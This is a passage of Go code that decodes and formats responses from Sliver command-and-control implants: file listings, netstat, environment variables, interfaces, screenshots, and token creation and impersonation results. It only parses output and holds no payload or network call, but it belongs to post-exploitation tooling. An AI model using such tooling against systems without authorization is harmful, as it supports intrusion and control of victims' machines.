		var resp sliverpb.Ls
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			var out strings.Builder
			if resp.Path != "" {
				out.WriteString(resp.Path + "\n")
			}
			for _, f := range resp.Files {
				dir := "-"
				if f.IsDir {
					dir = "d"
				}
				size := ""
				if !f.IsDir {
					size = fmt.Sprintf("%d", f.Size)
				}
				out.WriteString(fmt.Sprintf("%s %-11s %9s  %s\n", dir, f.Mode, size, f.Name))
			}
			return out.String()
		}

	case "netstat":
		var resp sliverpb.Netstat
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			var out strings.Builder
			out.WriteString("PROTO  LOCAL                 REMOTE                STATE        PID    PROCESS\n")
			for _, e := range resp.Entries {
				local, remote := "", ""
				if e.LocalAddr != nil {
					local = fmt.Sprintf("%s:%d", e.LocalAddr.Ip, e.LocalAddr.Port)
				}
				if e.RemoteAddr != nil {
					remote = fmt.Sprintf("%s:%d", e.RemoteAddr.Ip, e.RemoteAddr.Port)
				}
				var pid int32
				var proc string
				if e.Process != nil {
					pid = e.Process.Pid
					proc = e.Process.Executable
				}
				out.WriteString(fmt.Sprintf("%-7s%-22s%-22s%-13s%-7d%s\n",
					e.Protocol, local, remote, e.SkState, pid, proc))
			}
			return out.String()
		}

	case "env":
		var resp sliverpb.EnvInfo
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			var out strings.Builder
			for _, v := range resp.Variables {
				out.WriteString(fmt.Sprintf("%s=%s\n", v.Key, v.Value))
			}
			return out.String()
		}

	case "ifconfig":
		var resp sliverpb.Ifconfig
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			var out strings.Builder
			for _, ni := range resp.NetInterfaces {
				out.WriteString(fmt.Sprintf("%s  MAC=%s  IPs=%s\n",
					ni.Name, ni.MAC, strings.Join(ni.IPAddresses, ", ")))
			}
			return out.String()
		}

	case "screenshot":
		var resp sliverpb.Screenshot
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			if len(resp.Data) > 0 {
				return "data:image/png;base64," + base64.StdEncoding.EncodeToString(resp.Data)
			}
		}

	case "kill", "terminate":
		var resp sliverpb.Terminate
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			return "[+] process terminated"
		}

	case "rev2self":
		var resp sliverpb.RevToSelf
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			return "[+] reverted to self"
		}

	case "make-token":
		var resp sliverpb.MakeToken
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			return "[+] token created"
		}

	case "impersonate":
		var resp sliverpb.Impersonate
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			return "[+] impersonation successful"
		}

	case "mkdir":
		var resp sliverpb.Mkdir
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			return "[+] directory created: " + resp.Path
		}
	}

	// Fallback: try Execute protobuf parse, then raw string
	stdout, stderr := parseExecuteResponse(data)
	if stderr != "" {
		return stdout + "\n[stderr] " + stderr
	}
	if strings.TrimSpace(stdout) != "" && stdout != "(no output)" {
		return stdout
	}
	return fmt.Sprintf("[debug] %d response bytes, cmdType=%s - protobuf parse failed", len(data), cmdType)
}
